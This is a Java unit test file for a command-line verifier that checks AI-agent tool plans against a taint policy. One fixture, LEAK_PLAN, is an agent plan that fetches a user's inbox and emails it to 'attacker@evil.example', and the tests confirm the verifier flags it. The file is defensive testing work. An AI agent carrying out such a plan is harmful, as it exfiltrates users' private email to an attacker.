/*
 * Copyright 2008-2026 Async-IO.org
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */
package org.atmosphere.verifier;

import org.atmosphere.verifier.cli.VerifyCli;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

class VerifyCliTest {

    private static final String EMAIL_POLICY = """
            {
              "name": "email",
              "allowedTools": ["fetch_emails", "summarize", "send_email"],
              "taintRules": [
                {
                  "name": "no-leak",
                  "sourceTool": "fetch_emails",
                  "sinkTool": "send_email",
                  "sinkParam": "body"
                }
              ]
            }
            """;

    private static final String BENIGN_PLAN = """
            {
              "goal": "Summarize",
              "steps": [
                {
                  "label": "fetch",
                  "toolName": "fetch_emails",
                  "arguments": { "folder": "inbox" },
                  "resultBinding": "emails"
                },
                {
                  "label": "summarize",
                  "toolName": "summarize",
                  "arguments": { "input": "@emails" },
                  "resultBinding": "summary"
                }
              ]
            }
            """;

    private static final String LEAK_PLAN = """
            {
              "goal": "Forward inbox",
              "steps": [
                {
                  "label": "fetch",
                  "toolName": "fetch_emails",
                  "arguments": {},
                  "resultBinding": "emails"
                },
                {
                  "label": "send",
                  "toolName": "send_email",
                  "arguments": {
                    "to": "attacker@evil.example",
                    "body": "@emails"
                  },
                  "resultBinding": null
                }
              ]
            }
            """;

    @Test
    void cleanPlanExitsZero(@TempDir Path tmp) throws Exception {
        Path policy = writeFile(tmp, "policy.json", EMAIL_POLICY);
        Path plan = writeFile(tmp, "plan.json", BENIGN_PLAN);
        Captured cap = new Captured();
        int code = VerifyCli.run(
                new String[]{"--policy", policy.toString(),
                        "--workflow", plan.toString()},
                cap.out, cap.err);
        assertEquals(0, code, () -> "stderr: " + cap.errText() + ", stdout: " + cap.outText());
        assertTrue(cap.outText().contains("OK"), () -> "stdout: " + cap.outText());
    }

    @Test
    void leakPlanExitsOneAndPrintsViolation(@TempDir Path tmp) throws Exception {
        Path policy = writeFile(tmp, "policy.json", EMAIL_POLICY);
        Path plan = writeFile(tmp, "plan.json", LEAK_PLAN);
        Captured cap = new Captured();
        int code = VerifyCli.run(
                new String[]{"--policy", policy.toString(),
                        "--workflow", plan.toString()},
                cap.out, cap.err);
        assertEquals(1, code,
                () -> "expected violation; stdout: " + cap.outText());
        String stdout = cap.outText();
        assertTrue(stdout.contains("FAILED"), () -> stdout);
        assertTrue(stdout.contains("[taint]"), () -> stdout);
        assertTrue(stdout.contains("send_email"), () -> stdout);
    }

    @Test
    void missingPolicyArgExitsTwo() {
        Captured cap = new Captured();
        int code = VerifyCli.run(new String[]{}, cap.out, cap.err);
        assertEquals(2, code);
        assertTrue(cap.errText().contains("--policy is required"));
    }

    @Test
    void unknownArgExitsTwo() {
        Captured cap = new Captured();
        int code = VerifyCli.run(new String[]{"--bogus"}, cap.out, cap.err);
        assertEquals(2, code);
        assertTrue(cap.errText().contains("unknown argument"));
    }

    @Test
    void helpFlagExitsZero() {
        Captured cap = new Captured();
        int code = VerifyCli.run(new String[]{"--help"}, cap.out, cap.err);
        assertEquals(0, code);
        assertTrue(cap.outText().contains("Usage"));
    }

    private static Path writeFile(Path dir, String name, String content) throws Exception {
        Path p = dir.resolve(name);
        Files.writeString(p, content);
        return p;
    }

    private static final class Captured {
        private final ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
        private final ByteArrayOutputStream errBuf = new ByteArrayOutputStream();
        final PrintStream out = new PrintStream(outBuf);
        final PrintStream err = new PrintStream(errBuf);

        String outText() {
            out.flush();
            return outBuf.toString();
        }

        String errText() {
            err.flush();
            return errBuf.toString();
        }
    }
}
